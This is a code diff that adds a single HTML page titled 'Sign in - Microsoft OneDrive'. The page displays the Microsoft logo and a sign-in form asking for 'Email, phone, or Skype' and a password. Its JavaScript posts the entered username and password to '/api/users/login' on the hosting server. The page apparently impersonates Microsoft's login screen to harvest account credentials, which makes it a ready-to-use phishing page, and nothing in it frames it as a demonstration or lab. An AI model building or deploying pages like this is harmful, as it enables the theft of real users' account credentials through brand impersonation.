@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Microsoft OneDrive</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(to bottom right, 
+                rgba(255, 153, 153, 0.3), /* light red */
+                rgba(153, 204, 255, 0.3), /* light blue */
+                rgba(153, 255, 153, 0.3), /* light green */
+                rgba(255, 255, 153, 0.3)  /* light yellow */
+            );
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            width: 400px;
+            padding: 20px;
+            background: white;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            border-radius: 5px;
+            text-align: center;
+        }
+        .logo {
+            display: block;
+            margin: 0 auto 20px;
+        }
+        h2 {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            background: #0078d7;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover {
+            background: #005a9e;
+        }
+        p {
+            margin-top: 10px;
+            color: #555;
+        }
+        a {
+            color: #0078d7;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" class="logo" width="100">
+        <h2>Sign in</h2>
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Email, phone, or Skype" required>
+            <input type="password" id="password" placeholder="Enter password" required>
+            <button type="button" onclick="login()">Next</button>
+        </form>
+        <p>No account? <a href="#">Create one!</a></p>
+        <p id="message"></p>
+    </div>
+
+    <script>
+        function post(url, data) {
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.text())
+            .then(data => {
+                document.getElementById('message').textContent = data;
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+            });
+        }
+
+        function login() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            post('/api/users/login', { username, password });
+        }
+
+        function register() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            post('/api/users/register', { username, password });
+        }
+    </script>
+</body>
+</html>
